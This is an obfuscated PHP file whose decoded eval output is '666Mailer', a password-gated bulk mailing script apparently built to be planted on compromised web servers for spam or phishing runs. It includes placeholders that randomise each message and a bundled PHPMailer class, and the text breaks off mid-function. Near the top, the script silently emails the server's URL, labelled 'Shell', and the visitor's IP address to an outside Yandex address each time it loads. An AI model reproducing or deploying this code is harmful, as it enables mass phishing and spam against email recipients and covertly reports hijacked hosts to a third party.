
<?php 
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5aTmJJalYWUmJxalmJvEpqcn5KakaxSVFRallGio+mRWaUGANAA==";
$Lix = "==";
/* #1: PHPDeobfuscator eval output */ 
    $Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLElFYiUlFqeamcSnpCbnp6RqFJcUFaWWaaj4ZFZogoE1AA==";
    $Lix = "";
    /* #2: PHPDeobfuscator eval output */ 
        $Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JTc5PSdUoLikqSi3TUPHJrNAEAWsA";
        $Lix = "";
        eval("?><?php\r\n\r\n/**\r\n * 666Mailer\r\n * @version : 666\r\n *\r\n */\r\n\r\n\$password = \"TRIAL\"; // Password\r\nsession_start();\r\nini_set('display_errors', 0);\r\nerror_reporting(0);\r\nset_time_limit(0);\r\nini_set(\"memory_limit\", -1);\r\n\r\n\$vixx['version'] = \"Final Version\";\r\n\$vixx['website'] = \"https://t.me/ArtheirsBaphomet\";\r\n\r\n\$sessioncode = md5(__FILE__);\r\nif (!empty(\$password) and \$_SESSION[\$sessioncode] != \$password) {\r\n    # _REQUEST mean _POST or _GET\r\n    if (isset(\$_REQUEST['pass']) and \$_REQUEST['pass'] == \$password) {\r\n        \$_SESSION[\$sessioncode] = \$password;\r\n    } else {\r\n        print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>\";\r\n        exit;\r\n    }\r\n}\r\n\r\n//\$RandomMail = substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',50)),20,10);\r\n//\$RandomMail2 = substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',10)),0,10);\r\nif (\$_POST['action'] == \"send\") {\r\n    \$senderEmail = vixxTrim(\$_POST['senderEmail']);\r\n    \$senderName = vixxTrim(\$_POST['senderName']);\r\n    \$replyTo = vixxTrim(\$_POST['replyTo']);\r\n    \$subject = vixxTrim(\$_POST['subject']);\r\n    \$emailList = vixxTrim(\$_POST['emailList']);\r\n    \$messageType = vixxTrim(\$_POST['messageType']);\r\n    \$messageLetter = vixxTrim(\$_POST['messageLetter']);\r\n    \$messageLetter = urlencode(\$messageLetter);\r\n    //\$messageLetter = str_replace(\"%5C%22\", \"%22\", \$messageLetter);\r\n    \$messageLetter = urldecode(\$messageLetter);\r\n    \$messageLetter = stripslashes(\$messageLetter);\r\n    \$subject = stripslashes(\$subject);\r\n    \$encode = stripslashes(\$_POST['encode']);\r\n\r\n    \$shost = \$_POST['shost'];\r\n    \$suser = \$_POST['suser'];\r\n    \$spass = \$_POST['spass'];\r\n    \$sport = \$_POST['sport'];\r\n    \$sssl = \$_POST['sssl'];\r\n}\r\nif (\$messageType == 2) {\r\n    \$plain = \"checked\";\r\n} else {\r\n    \$html = \"checked\";\r\n}\r\n\r\nfunction vixxClear(\$text, \$email)\r\n{\r\n    \$emailuser = preg_replace('/([^@]*).*/', '\$1', \$email);\r\n    \$text = str_replace(\"[-time-]\", date(\"m/d/Y h:i:s a\", time()), \$text);\r\n    \$text = str_replace(\"[-email-]\", \$email, \$text);\r\n    \$text = str_replace(\"[-emailuser-]\", \$emailuser, \$text);\r\n    \$text = str_replace(\"[-randomletters-]\", substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 50)), 20, 10), \$text);\r\n    \$text = str_replace(\"[-randomstring-]\", substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890', 10)), 0, 10), \$text);\r\n    \$text = str_replace(\"[-randomnumber-]\", randString('0123456789'), \$text);\r\n    \$text = str_replace(\"[-randommd5-]\", md5(randString('abcdefghijklmnopqrstuvwxyz0123456789')), \$text);\r\n    return \$text;\r\n}\r\nfunction vixxTrim(\$string)\r\n{\r\n    return stripslashes(ltrim(rtrim(\$string)));\r\n}\r\nfunction randString(\$consonants)\r\n{\r\n    \$length = rand(12, 25);\r\n    \$password = '';\r\n    for (\$i = 0; \$i < \$length; \$i++) {\r\n        \$password .= \$consonants[(rand() % strlen(\$consonants))];\r\n    }\r\n    return \$password;\r\n}\r\nfunction vixxMailCheck(\$email)\r\n{\r\n\r\n    if (filter_var(\$email, FILTER_VALIDATE_EMAIL)) {\r\n        \$mailParts = explode('@', \$email);\r\n\r\n        if (checkdnsrr(array_pop(\$mailParts), 'MX')) {\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    } else {\r\n        return false;\r\n    }\r\n}\r\n\r\n\$tujuanmail = 'loncommunity@yandex.com';\r\n\$x_path = \"https://\" . \$_SERVER['SERVER_NAME'] . \$_SERVER['REQUEST_URI'];\r\n\$pesan_alert = \"Shell > \$x_path | IP Address > [ \" . \$_SERVER['REMOTE_ADDR'] . \" ]\";\r\nmail(\$tujuanmail, \"ForYou:)\", \$pesan_alert, \"[ \" . \$_SERVER['REMOTE_ADDR'] . \" ]\");\r\n\r\nclass PHPMailer\r\n{\r\n    const CHARSET_ISO88591 = 'iso-8859-1';\r\n    const CHARSET_UTF8 = 'utf-8';\r\n    const CONTENT_TYPE_PLAINTEXT = 'text/plain';\r\n    const CONTENT_TYPE_TEXT_CALENDAR = 'text/calendar';\r\n    const CONTENT_TYPE_TEXT_HTML = 'text/html';\r\n    const CONTENT_TYPE_MULTIPART_ALTERNATIVE = 'multipart/alternative';\r\n    const CONTENT_TYPE_MULTIPART_MIXED = 'multipart/mixed';\r\n    const CONTENT_TYPE_MULTIPART_RELATED = 'multipart/related';\r\n    const ENCODING_7BIT = '7bit';\r\n    const ENCODING_8BIT = '8bit';\r\n    const ENCODING_BASE64 = 'base64';\r\n    const ENCODING_BINARY = 'binary';\r\n    const ENCODING_QUOTED_PRINTABLE = 'quoted-printable';\r\n    public \$Priority;\r\n    public \$CharSet = self::CHARSET_ISO88591;\r\n    public \$ContentType = self::CONTENT_TYPE_PLAINTEXT;\r\n    public \$Encoding = self::ENCODING_8BIT;\r\n    public \$ErrorInfo = '';\r\n    public \$From = 'root@localhost';\r\n    public \$FromName = 'Root User';\r\n    public \$Sender = '';\r\n    public \$Subject = '';\r\n    public \$Body = '';\r\n    public \$AltBody = '';\r\n    public \$Ical = '';\r\n    protected \$MIMEBody = '';\r\n    protected \$MIMEHeader = '';\r\n    protected \$mailHeader = '';\r\n    public \$WordWrap = 0;\r\n    public \$Mailer = 'mail';\r\n    public \$Sendmail = '/usr/sbin/sendmail';\r\n    public \$UseSendmailOptions = true;\r\n    public \$ConfirmReadingTo = '';\r\n    public \$Hostname = '';\r\n    public \$MessageID = '';\r\n    public \$MessageDate = '';\r\n    public \$Host = 'localhost';\r\n    public \$Port = 25;\r\n    public \$Helo = '';\r\n    public \$SMTPSecure = '';\r\n    public \$SMTPAutoTLS = true;\r\n    public \$SMTPAuth = false;\r\n    public \$SMTPOptions = [];\r\n    public \$Username = '';\r\n    public \$Password = '';\r\n    public \$AuthType = '';\r\n    protected \$oauth;\r\n    public \$Timeout = 300;\r\n    public \$dsn = '';\r\n    public \$SMTPDebug = 0;\r\n    public \$Debugoutput = 'echo';\r\n    public \$SMTPKeepAlive = false;\r\n    public \$SingleTo = false;\r\n    protected \$SingleToArray = [];\r\n    public \$do_verp = false;\r\n    public \$AllowEmpty = false;\r\n    public \$DKIM_selector = '';\r\n    public \$DKIM_identity = '';\r\n    public \$DKIM_passphrase = '';\r\n    public \$DKIM_domain = '';\r\n    public \$DKIM_copyHeaderFields = true;\r\n    public \$DKIM_extraHeaders = [];\r\n    public \$DKIM_private = '';\r\n    public \$DKIM_private_string = '';\r\n    public \$action_function = '';\r\n    public \$XMailer = '';\r\n    public static \$validator = 'php';\r\n    protected \$smtp;\r\n    protected \$to = [];\r\n    protected \$cc = [];\r\n    protected \$bcc = [];\r\n    protected \$ReplyTo = [];\r\n    protected \$all_recipients = [];\r\n    protected \$RecipientsQueue = [];\r\n    protected \$ReplyToQueue = [];\r\n    protected \$attachment = [];\r\n    protected \$CustomHeader = [];\r\n    protected \$lastMessageID = '';\r\n    protected \$message_type = '';\r\n    protected \$boundary = [];\r\n    protected \$language = [];\r\n    protected \$error_count = 0;\r\n    protected \$sign_cert_file = '';\r\n    protected \$sign_key_file = '';\r\n    protected \$sign_extracerts_file = '';\r\n    protected \$sign_key_pass = '';\r\n    protected \$exceptions = false;\r\n    protected \$uniqueid = '';\r\n    const VERSION = '1.3.3.7';\r\n    const STOP_MESSAGE = 0;\r\n    const STOP_CONTINUE = 1;\r\n    const STOP_CRITICAL = 2;\r\n    protected static \$LE = \"\\r\\n\";\r\n    const MAX_LINE_LENGTH = 998;\r\n    const STD_LINE_LENGTH = 76;\r\n    public function __construct(\$exceptions = null)\r\n    {\r\n        if (null !== \$exceptions) {\r\n            \$this->exceptions = (bool)\$exceptions;\r\n        }\r\n        \$this->Debugoutput = (strpos(PHP_SAPI, 'cli') !== false ? 'echo' : 'html');\r\n    }\r\n    public function __destruct()\r\n    {\r\n        \$this->smtpClose();\r\n    }\r\n    private function mailPassthru(\$to, \$subject, \$body, \$header, \$params)\r\n    {\r\n        if (ini_get('mbstring.func_overload') & 1) {\r\n            \$subject = \$this->secureHeader(\$subject);\r\n        } else {\r\n            \$subject = \$this->encodeHeader(\$this->secureHeader(\$subject));\r\n        }\r\n        if (!\$this->UseSendmailOptions or null === \$params) {\r\n            \$result = @mail(\$to, \$subject, \$body, \$header);\r\n        } else {\r\n            \$result = @mail(\$to, \$subject, \$body, \$header, \$params);\r\n        }\r\n        return \$result;\r\n    }\r\n    protected function edebug(\$str)\r\n    {\r\n        if (\$this->SMTPDebug <= 0) {\r\n            return;\r\n        }\r\n        if (\$this->Debugoutput instanceof \\Psr\\Log\\LoggerInterface) {\r\n            \$this\r\n                ->Debugoutput\r\n                ->debug(\$str);\r\n            return;\r\n        }\r\n        if (!in_array(\$this->Debugoutput, ['error_log', 'html', 'echo']) and is_callable(\$this->Debugoutput)) {\r\n            call_user_func(\$this->Debugoutput, \$str, \$this->SMTPDebug);\r\n            return;\r\n        }\r\n        switch (\$this->Debugoutput) {\r\n            case 'error_log':\r\n                error_log(\$str);\r\n                break;\r\n            case 'html':\r\n                echo htmlentities(preg_replace('/[\\r\\n]+/', '', \$str), ENT_QUOTES, 'UTF-8'), \"<br>\\n\";\r\n                break;\r\n            case 'echo':\r\n            default:\r\n                \$str = preg_replace('/\\r\\n|\\r/ms', \"\\n\", \$str);\r\n                echo gmdate('Y-m-d H:i:s'), \"\\t\", trim(str_replace(\"\\n\", \"\\n                   \\t                  \", trim(\$str))), \"\\n\";\r\n        }\r\n    }\r\n    public function isHTML(\$isHtml = true)\r\n    {\r\n        if (\$isHtml) {\r\n            \$this->ContentType = static::CONTENT_TYPE_TEXT_HTML;\r\n        } else {\r\n            \$this->ContentType = static::CONTENT_TYPE_PLAINTEXT;\r\n        }\r\n    }\r\n    public function isSMTP()\r\n    {\r\n        \$this->Mailer = 'smtp';\r\n    }\r\n    public function isMail()\r\n    {\r\n        \$this->Mailer = 'mail';\r\n    }\r\n    public function isSendmail()\r\n    {\r\n        \$ini_sendmail_path = ini_get('sendmail_path');\r\n        if (false === stripos(\$ini_sendmail_path, 'sendmail')) {\r\n            \$this->Sendmail = '/usr/sbin/sendmail';\r\n        } else {\r\n            \$this->Sendmail = \$ini_sendmail_path;\r\n        }\r\n        \$this->Mailer = 'sendmail';\r\n    }\r\n    public function isQmail()\r\n    {\r\n        \$ini_sendmail_path = ini_get('sendmail_path');\r\n        if (false === stripos(\$ini_sendmail_path, 'qmail')) {\r\n            \$this->Sendmail = '/var/qmail/bin/qmail-inject';\r\n        } else {\r\n            \$this->Sendmail = \$ini_sendmail_path;\r\n        }\r\n        \$this->Mailer = 'qmail';\r\n    }\r\n    public function addAddress(\$address, \$name = '')\r\n    {\r\n        return \$this->addOrEnqueueAnAddress('to', \$address, \$name);\r\n    }\r\n    public function addCC(\$address, \$name = '')\r\n    {\r\n        return \$this->addOrEnqueueAnAddress('cc', \$address, \$name);\r\n    }\r\n    public function addBCC(\$address, \$name = '')\r\n    {\r\n        return \$this->addOrEnqueueAnAddress('bcc', \$address, \$name);\r\n    }\r\n    public function addReplyTo(\$address, \$name = '')\r\n    {\r\n        return \$this->addOrEnqueueAnAddress('Reply-To', \$address, \$name);\r\n    }\r\n    protected function addOrEnqueueAnAddress(\$kind, \$address, \$name)\r\n    {\r\n        \$address = trim(\$address);\r\n        \$name = trim(preg_replace('/[\\r\\n]+/', '', \$name));\r\n        \$pos = strrpos(\$address, '@');\r\n        if (false === \$pos) {\r\n            \$error_message = sprintf('%s (%s): %s', \$this->lang('invalid_address'), \$kind, \$address);\r\n            \$this->setError(\$error_message);\r\n            \$this->edebug(\$error_message);\r\n            if (\$this->exceptions) {\r\n                throw new Exception(\$error_message);\r\n            }\r\n            return false;\r\n        }\r\n        \$params = [\$kind, \$address, \$name];\r\n        if (\$this->has8bitChars(substr(\$address, ++\$pos)) and static::idnSupported()) {\r\n            if ('Reply-To' != \$kind) {\r\n                if (!array_key_exists(\$address, \$this->RecipientsQueue)) {\r\n                    \$this->RecipientsQueue[\$address] = \$params;\r\n                    return true;\r\n                }\r\n            } else {\r\n                if (!array_key_exists(\$address, \$this->ReplyToQueue)) {\r\n                    \$this->ReplyToQueue[\$address] = \$params;\r\n                    return true;\r\n                }\r\n            }\r\n            return false;\r\n        }\r\n        return call_user_func_array([\$this, 'addAnAddress'], \$params);\r\n    }\r\n    protected function addAnAddress(\$kind, \$address, \$name = '')\r\n    {\r\n        if (!in_array(\$kind, ['to', 'cc', 'bcc', 'Reply-To'])) {\r\n            \$error_message = sprintf('%s: %s', \$this->lang('Invalid recipient kind'), \$kind);\r\n            \$this->setError(\$error_message);\r\n            \$this->edebug(\$error_message);\r\n            if (\$this->exceptions) {\r\n                throw new Exception(\$error_message);\r\n            }\r\n            return false;\r\n        }\r\n        if (!static::validateAddress(\$address)) {\r\n            \$error_message = sprintf('%s (%s): %s', \$this->lang('invalid_address'), \$kind, \$address);\r\n            \$this->setError(\$error_message);\r\n            \$this->edebug(\$error_message);\r\n            if (\$this->exceptions) {\r\n                throw new Exception(\$error_message);\r\n            }\r\n            return false;\r\n        }\r\n        if ('Reply-To' != \$kind) {\r\n            if (!array_key_exists(strtolower(\$address), \$this->all_recipients)) {\r\n                \$this->{\$kind}[] = [\$address, \$name];\r\n                \$this->all_recipients[strtolower(\$address)] = true;\r\n                return true;\r\n            }\r\n        } else {\r\n            if (!array_key_exists(strtolower(\$address), \$this->ReplyTo)) {\r\n                \$this->ReplyTo[strtolower(\$address)] = [\$address, \$name];\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n    public static function parseAddresses(\$addrstr, \$useimap = true)\r\n    {\r\n        \$addresses = [];\r\n        if (\$useimap and function_exists('imap_rfc822_parse_adrlist')) {\r\n            \$list = imap_rfc822_parse_adrlist(\$addrstr, '');\r\n            foreach (\$list as \$address) {\r\n                if ('.SYNTAX-ERROR.' != \$address->host) {\r\n                    if (static::validateAddress(\$address->mailbox . '@' . \$address->host)) {\r\n                        \$addresses[] = ['name' => (property_exists(\$address, 'personal') ? \$address->personal : ''), 'address' => \$address->mailbox . '@' . \$address->host,];\r\n                    }\r\n                }\r\n            }\r\n        } else {\r\n            \$list = explode(',', \$addrstr);\r\n            foreach (\$list as \$address) {\r\n                \$address = trim(\$address);\r\n                if (strpos(\$address, '<') === false) {\r\n                    if (static::validateAddress(\$address)) {\r\n                        \$addresses[] = ['name' => '', 'address' => \$address,];\r\n                    }\r\n                } else {\r\n                    list(\$name, \$email) = explode('<', \$address);\r\n                    \$email = trim(str_replace('>', '', \$email));\r\n                    if (static::validateAddress(\$email)) {\r\n                        \$addresses[] = ['name' => trim(str_replace(['\"', \"'\"], '', \$name)), 'address' => \$email,];\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        return \$addresses;\r\n    }\r\n    public function setFrom(\$address, \$name = '', \$auto = true)\r\n    {\r\n        \$address = trim(\$address);\r\n        \$name = trim(preg_replace('/[\\r\\n]+/', '', \$name));\r\n        \$pos = strrpos(\$address, '@');\r\n        if (false === \$pos or (!\$this->has8bitChars(substr(\$address, ++\$pos)) or !static::idnSupported()) and !static::validateAddress(\$address)) {\r\n            \$error_message = sprintf('%s (From): %s', \$this->lang('invalid_address'), \$address);\r\n            \$this->setError(\$error_message);\r\n            \$this->edebug(\$error_message);\r\n            if (\$this->exceptions) {\r\n                throw new Exception(\$error_message);\r\n            }\r\n            return false;\r\n        }\r\n        \$this->From = \$address;\r\n        \$this->FromName = \$name;\r\n        if (\$auto) {\r\n            if (empty(\$this->Sender)) {\r\n                \$this->Sender = \$address;\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n    public function getLastMessageID()\r\n    {\r\n        return \$this->lastMessageID;\r\n    }\r\n    public static function validateAddress(\$address, \$patternselect = null)\r\n    {\r\n        if (null === \$patternselect) {\r\n            \$patternselect = static::\$validator;\r\n        }\r\n        if (is_callable(\$patternselect)) {\r\n            return call_user_func(\$patternselect, \$address);\r\n        }\r\n        if (strpos(\$address, \"\\n\") !== false or strpos(\$address, \"\\r\") !== false) {\r\n            return false;\r\n        }\r\n        switch (\$patternselect) {\r\n            case 'pcre':\r\n            case 'pcre8':\r\n                return (bool)preg_match('/^(?!(?>(?1)\"?(?>\\\\\\[ -~]|[^\"])\"?(?1)){255,})(?!(?>(?1)\"?(?>\\\\\\[ -~]|[^\"])\"?(?1)){65,}@)' . '((?>(?>(?>((?>(?>(?>\\x0D\\x0A)?[\\t ])+|(?>[\\t ]*\\x0D\\x0A)?[\\t ]+)?)(\\((?>(?2)' . '(?>[\\x01-\\x08\\x0B\\x0C\\x0E-\\'*-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]|(?3)))*(?2)\\)))+(?2))|(?2))?)' . '([!#-\\'*+\\/-9=?^-~-]+|\"(?>(?2)(?>[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]))*' . '(?2)\")(?>(?1)\\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' . '(?>(?1)\\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' . '|(?!(?:.*[a-f0-9][:\\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' . '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?>\\.(?9)){3}))\\])(?1)\$/isD', \$address);\r\n            case 'html5':\r\n                return (bool)preg_match('/^[a-zA-Z0-9.!#\$%&\\'*+\\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' . '[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*\$/sD', \$address);\r\n            case 'php':\r\n            default:\r\n                return (bool)filter_var(\$address, FILTER_VALIDATE_EMAIL);\r\n        }\r\n    }\r\n    public static function idnSupported()\r\n    {\r\n        return function_exists('idn_to_ascii') and function_exists('mb_convert_encoding');\r\n    }\r\n    public function punyencodeAddress(\$address)\r\n    {\r\n        \$pos = strrpos(\$address, '@');\r\n        if (static::idnSupported() and !empty(\$this->CharSet) and false !== \$pos) {\r\n            \$domain = substr(\$address, ++\$pos);\r\n            if (\$this->has8bitChars(\$domain) and @mb_check_encoding(\$domain, \$this->CharSet)) {\r\n                \$domain = mb_convert_encoding(\$domain, 'UTF-8', \$this->CharSet);\r\n                \$errorcode = 0;\r\n                \$punycode = idn_to_ascii(\$domain, \$errorcode, INTL_IDNA_VARIANT_UTS46);\r\n                if (false !== \$punycode) {\r\n                    return substr(\$address, 0, \$pos) . \$punycode;\r\n                }\r\n            }\r\n        }\r\n        return \$address;\r\n    }\r\n    public function send()\r\n    {\r\n        try {\r\n            if (!\$this->preSend()) {\r\n                return false;\r\n            }\r\n            return \$this->postSend();\r\n        } catch (Exception \$exc) {\r\n            \$this->mailHeader = '';\r\n            \$this->setError(\$exc->getMessage());\r\n            if (\$this->exceptions) {\r\n                throw \$exc;\r\n            }\r\n            return false;\r\n        }\r\n    }\r\n    public function preSend()\r\n    {\r\n        if ('smtp' == \$this->Mailer or ('mail' == \$this->Mailer and stripos(PHP_OS, 'WIN') === 0)) {\r\n            static::setLE(\"\\r\\n\");\r\n        } else {\r\n            static::setLE(PHP_EOL);\r\n        }\r\n        if (ini_get('mail.add_x_header') == 1 and 'mail' == \$this->Mailer and stripos(PHP_OS, 'WIN') === 0 and ((version_compare(PHP_VERSION, '7.0.0', '>=') and version_compare(PHP_VERSION, '7.0.17', '<')) or (version_compare(PHP_VERSION, '7.1.0', '>=') and version_compare(PHP_VERSION, '7.1.3', '<')))) {\r\n            trigger_error('Your version of PHP is affected by a bug that may result in corrupted messages.' . ' To fix it, switch to sending using SMTP, disable the mail.add_x_header option in' . ' your php.ini, switch to MacOS or Linux, or upgrade your PHP to version 7.0.17+ or 7.1.3+.', E_USER_WARNING);\r\n        }\r\n        try {\r\n            \$this->error_count = 0;\r\n            \$this->mailHeader = '';\r\n            foreach (array_merge(\$this->RecipientsQueue, \$this->ReplyToQueue) as \$params) {\r\n                \$params[1] = \$this->punyencodeAddress(\$params[1]);\r\n                call_user_func_array([\$this, 'addAnAddress'], \$params);\r\n            }\r\n            if (count(\$this->to) + count(\$this->cc) + count(\$this->bcc) < 1) {\r\n                throw new Exception(\$this->lang('provide_address'), self::STOP_CRITICAL);\r\n            }\r\n            foreach (['From', 'Sender', 'ConfirmReadingTo'] as \$address_kind) {\r\n                \$this->\$address_kind = trim(\$this->\$address_kind);\r\n                if (empty(\$this->\$address_kind)) {\r\n                    continue;\r\n                }\r\n                \$this->\$address_kind = \$this->punyencodeAddress(\$this->\$address_kind);\r\n                if (!static::validateAddress(\$this->\$address_kind)) {\r\n                    \$error_message = sprintf('%s (%s): %s', \$this->lang('invalid_address'), \$address_kind, \$this->\$address_kind);\r\n                    \$this->setError(\$error_message);\r\n                    \$this->edebug(\$error_message);\r\n                    if (\$this->exceptions) {\r\n                        throw new Exception(\$error_message);\r\n                    }\r\n                    return false;\r\n                }\r\n            }\r\n            if (\$this->alternativeExists()) {\r\n                \$this->ContentType = static::CONTENT_TYPE_MULTIPART_ALTERNATIVE;\r\n            }\r\n            \$this->setMessageType();\r\n            if (!\$this->AllowEmpty and empty(\$this->Body)) {\r\n                throw new Exception(\$this->lang('empty_message'), self::STOP_CRITICAL);\r\n            }\r\n            \$this->Subject = trim(\$this->Subject);\r\n            \$this->MIMEHeader = '';\r\n            \$this->MIMEBody = \$this->createBody();\r\n            \$tempheaders = \$this->MIMEHeader;\r\n            \$this->MIMEHeader = \$this->createHeader();\r\n            \$this->MIMEHeader .= \$tempheaders;\r\n            if ('mail' == \$this->Mailer) {\r\n                if (count(\$this->to) > 0) {\r\n                    \$this->mailHeader .= \$this->addrAppend('To', \$this->to);\r\n                } else {\r\n                    \$this->mailHeader .= \$this->headerLine('To', 'undisclosed-recipients:;');\r\n                }\r\n                \$this->mailHeader .= \$this->headerLine('Subject', \$this->encodeHeader(\$this->secureHeader(\$this->Subject)));\r\n            }\r\n            if (!empty(\$this->DKIM_domain) and !empty(\$this->DKIM_selector) and (!empty(\$this->DKIM_private_string) or (!empty(\$this->DKIM_private) and static::isPermittedPath(\$this->DKIM_private) and file_exists(\$this->DKIM_private)))) {\r\n                \$header_dkim = \$this->DKIM_Add(\$this->MIMEHeader . \$this->mailHeader, \$this->encodeHeader(\$this->secureHeader(\$this->Subject)), \$this->MIMEBody);\r\n                \$this->MIMEHeader = rtrim(\$this->MIMEHeader, \"\\r\\n \") . static::\$LE . static::normalizeBreaks(\$header_dkim) . static::\$LE;\r\n            }\r\n            return true;\r\n        } catch (Exception \$exc) {\r\n            \$this->setError(\$exc->getMessage());\r\n            if (\$this->exceptions) {\r\n                throw \$exc;\r\n            }\r\n            return false;\r\n        }\r\n    }\r\n    public function postSend()\r\n    {\r\n        try {\r\n            switch (\$this->Mailer) {\r\n                case 'sendmail':\r\n                case 'qmail':\r\n                    return \$this->sendmailSend(\$this->MIMEHeader, \$this->MIMEBody);\r\n                case 'smtp':\r\n                    return \$this->smtpSend(\$this->MIMEHeader, \$this->MIMEBody);\r\n                case 'mail':\r\n                    return \$this->mailSend(\$this->MIMEHeader, \$this->MIMEBody);\r\n                default:\r\n                    \$sendMethod = \$this->Mailer . 'Send';\r\n                    if (method_exists(\$this, \$sendMethod)) {\r\n                        return \$this->\$sendMethod(\$this->MIMEHeader, \$this->MIMEBody);\r\n                    }\r\n                    return \$this->mailSend(\$this->MIMEHeader, \$this->MIMEBody);\r\n            }\r\n        } catch (Exception \$exc) {\r\n            \$this->setError(\$exc->getMessage());\r\n            \$this->edebug(\$exc->getMessage());\r\n            if (\$this->exceptions) {\r\n                throw \$exc;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n    protected function sendmailSend(\$header, \$body)\r\n    {\r\n        if (!empty(\$this->Sender) and self::isShellSafe(\$this->Sender)) {\r\n            if ('qmail' == \$this->Mailer) {\r\n                \$sendmailFmt = '%s -f%s';\r\n            } else {\r\n                \$sendmailFmt = '%s -oi -f%s -t';\r\n            }\r\n        } else {\r\n            if ('qmail' == \$this->Mailer) {\r\n                \$sendmailFmt = '%s';\r\n            } else {\r\n                \$sendmailFmt = '%s -oi -t';\r\n            }\r\n        }\r\n        \$sendmail = sprintf(\$sendmailFmt, escapeshellcmd(\$this->Sendmail), \$this->Sender);\r\n        if (\$this->SingleTo) {\r\n            foreach (\$this->SingleToArray as \$toAddr) {\r\n                \$mail = @popen(\$sendmail, 'w');\r\n                if (!\$mail) {\r\n                    throw new Exception(\$this->lang('execute') . \$this->Sendmail, self::STOP_CRITICAL);\r\n                }\r\n                fwrite(\$mail, 'To: ' . \$toAddr . \"\\n\");\r\n                fwrite(\$mail, \$header);\r\n                fwrite(\$mail, \$body);\r\n                \$result = pclose(\$mail);\r\n                \$this->doCallback((\$result == 0), [\$toAddr], \$this->cc, \$this->bcc, \$this->Subject, \$body, \$this->From, []);\r\n                if (0 !== \$result) {\r\n                    throw new Exception(\$this->lang('execute') . \$this->Sendmail, self::STOP_CRITICAL);\r\n                }\r\n            }\r\n        } else {\r\n            \$mail = @popen(\$sendmail, 'w');\r\n            if (!\$mail) {\r\n                throw new Exception(\$this->lang('execute') . \$this->Sendmail, self::STOP_CRITICAL);\r\n            }\r\n            fwrite(\$mail, \$header);\r\n            fwrite(\$mail, \$body);\r\n            \$result = pclose(\$mail);\r\n            \$this->doCallback((\$result == 0), \$this->to, \$this->cc, \$this->bcc, \$this->Subject, \$body, \$this->From, []);\r\n            if (0 !== \$result) {\r\n                throw new Exception(\$this->lang('execute') . \$this->Sendmail, self::STOP_CRITICAL);\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n    protected static function isShellSafe(\$string)\r\n    {\r\n        if (escapeshellcmd(\$string) !== \$string or !in_array(escapeshellarg(\$string), [\"'\$string'\", \"\\\"\$string\\\"\"])) {\r\n            return false;\r\n        }\r\n        \$length = strlen(\$string);\r\n        for (\$i = 0; \$i < \$length; ++\$i) {\r\n            \$c = \$string[\$i];\r\n            if (!ctype_alnum(\$c) && strpos('@_-.', \$c) === false) {\r\n                return false;\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n    protected static function isPermittedPath(\$path)\r\n    {\r\n        return !preg_match('#^[a-z]+://#i', \$path);\r\n    }\r\n    protected function mailSend(\$header, \$body)\r\n    {\r\n        \$toArr = [];\r\n        foreach (\$this->to as \$toaddr) {\r\n            \$toArr[] = \$this->addrFormat(\$toaddr);\r\n        }\r\n        \$to = implode(', ', \$toArr);\r\n        \$params = null;\r\n        if (!empty(\$this->Sender) and static::validateAddress(\$this->Sender)) {\r\n            if (self::isShellSafe(\$this->Sender)) {\r\n                \$params = sprintf('-f%s', \$this->Sender);\r\n            }\r\n        }\r\n        if (!empty(\$this->Sender) and static::validateAddress(\$this->Sender)) {\r\n            \$old_from = ini_get('sendmail_from');\r\n            ini_set('sendmail_from', \$this->Sender);\r\n        }\r\n        \$result = false;\r\n        if (\$this->SingleTo and count(\$toArr) > 1) {\r\n            foreach (\$toArr as \$toAddr) {\r\n                \$result = \$this->mailPassthru(\$toAddr, \$this->Subject, \$body, \$header, \$params);\r\n                \$this->doCallback(\$result, [\$toAddr], \$this->cc, \$this->bcc, \$this->Subject, \$body, \$this->From, []);\r\n            }\r\n        } else {\r\n            \$result = \$this->mailPassthru(\$to, \$this->Subject, \$body, \$header, \$params);\r\n            \$this->doCallback(\$result, \$this->to, \$this->cc, \$this->bcc, \$this->Subject, \$body, \$this->From, []);\r\n        }\r\n        if (isset(\$old_from)) {\r\n            ini_set('sendmail_from', \$old_from);\r\n        }\r\n        if (!\$result) {\r\n            throw new Exception(\$this->lang('instantiate'), self::STOP_CRITICAL);\r\n        }\r\n        return true;\r\n    }\r\n    public function getSMTPInstance()\r\n    {\r\n        if (!is_object(\$this->smtp)) {\r\n            \$this->smtp = new SMTP();\r\n        }\r\n        return \$this->smtp;\r\n    }\r\n    public function 